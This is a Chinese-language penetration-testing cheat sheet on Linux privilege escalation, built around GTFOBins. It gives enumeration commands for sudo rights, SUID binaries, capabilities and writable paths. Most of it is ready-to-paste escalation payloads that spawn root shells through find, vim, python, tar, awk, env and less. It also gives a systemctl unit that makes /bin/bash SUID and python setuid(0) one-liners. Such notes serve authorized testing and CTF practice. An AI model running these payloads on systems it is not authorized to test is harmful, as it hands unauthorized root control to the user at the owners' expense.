---
cmd_type: PrivEsc
os: linux
tags:
  - cmd
syntax: sudo -l
---

# GTFOBins 提权速查

## 适用场景

- `sudo -l` 显示当前用户能以 root 运行某个二进制（`(ALL) NOPASSWD: /usr/bin/xxx` 或 `(ALL : ALL) ALL`）。
- 发现 SUID 二进制（`-rwsr-xr-x root root`）。
- 发现带 capabilities 的二进制（`cap_setuid+ep` 等）。
- 核心思路：**每条 sudo 结果 / 每个 SUID 二进制 / 每个 capability → 到 GTFOBins 查对应提权 payload**。

## 枚举命令

```bash
sudo -l                                                        # 查看当前用户可提权运行的命令
find / -perm -4000 -type f 2>/dev/null                         # 查找 SUID 二进制
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;       # 列出 SUID 文件及权限
getcap -r / 2>/dev/null                                        # 递归查找带 capabilities 的文件
find / -writable -type f 2>/dev/null | grep -v proc            # 查找可写文件（含 /proc 噪音过滤）
find / -writable -type d 2>/dev/null | grep -v proc            # 查找可写目录（用于 PATH / cron 劫持）
```

## 利用步骤

### 1. sudo 提权（sudo -l 结果 → GTFOBins payload）

拿到 `sudo -l` 允许的二进制后，去 https://gtfobins.github.io 搜该二进制名，抄对应 payload。下面是高频示例。

```bash
# find
sudo find . -exec /bin/sh \; -quit

# vim
sudo vim -c ':!/bin/sh'

# python / python3
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import pty; pty.spawn("/bin/sh")'

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# less / more（进入分页后输入 !sh 回车）
sudo less /etc/passwd
!sh

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# env
sudo env /bin/sh

# systemctl（两种方式）
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
# 第二种：sudo systemctl 进入分页后输入 !sh 回车
sudo systemctl
!sh
```

### 2. SUID 提权（把上面 payload 的 sudo 去掉，直接以 root 运行）

```bash
# 例：/usr/bin/find 是 SUID
find . -exec /bin/sh \; -quit
# 例：SUID python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 3. Capabilities 提权

```bash
getcap -r / 2>/dev/null
# 输出示例：/usr/bin/python3.8 = cap_setuid+ep
# cap_setuid 可直接 setuid(0)
./python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## 常见坑

- `sudo -l` 输出里 `(ALL : ALL) ALL` 但要求密码 → 需要当前用户密码才能 sudo；只有 `NOPASSWD` 才能免密。
- 有些 SUID 二进制虽是 root 属主但被 SELinux / AppArmor 限制，提权会失败。
- GTFOBins 的 payload 依赖 shell 环境变量，务必用交互 shell 跑，别在受限 shell 里直接粘。
- `find / -perm -4000` 会漏掉部分文件系统（挂载点权限），必要时补 `-xdev` 逐分区查。
- SUID 对脚本（shebang 脚本）在多数 Linux 上不生效（内核忽略脚本的 SUID 位），要用 ELF 二进制。

## 参考开源项目

- GTFOBins — https://gtfobins.github.io/
- linpeas / PEASS-ng — https://github.com/peass-ng/PEASS-ng
